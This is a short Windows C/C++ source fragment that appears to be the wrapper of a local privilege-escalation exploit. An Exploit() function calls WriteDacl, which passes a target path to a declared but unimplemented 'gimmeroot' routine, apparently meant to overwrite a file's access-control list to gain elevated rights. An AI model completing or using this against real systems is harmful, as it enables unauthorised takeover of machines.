#include <Windows.h>
#include <stdio.h>
#include <tchar.h>

void gimmeroot(_TCHAR* targetpath, bool hijack);

wchar_t* GetTargetPath();

int WriteDacl(wchar_t* outfilepath)
{
	gimmeroot(outfilepath, false);
	return 0;
}

void Exploit()
{
	WriteDacl(GetTargetPath());
}